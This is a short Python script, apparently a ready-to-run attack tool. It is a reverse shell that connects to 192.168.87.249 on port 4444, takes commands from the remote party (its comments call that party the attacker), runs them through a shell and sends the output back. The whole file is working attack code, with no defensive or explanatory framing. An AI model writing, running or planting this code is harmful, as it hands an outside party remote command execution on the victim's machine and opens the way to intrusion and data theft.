import socket
import subprocess
import os

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.87.249', 4444))
    
    while True:
        # Receive the command from the attacker
        data = s.recv(1024)
        
        # If no data is received, break the loop
        if len(data) == 0:
            break
        
        # Execute the received command
        proc = subprocess.Popen(data.decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc.stdout.read() + proc.stderr.read()
        
        # Send the command output to the attacker
        s.send(stdout_value)
    
    # Close the connection
    s.close()

if __name__ == "__main__":
    reverse_shell()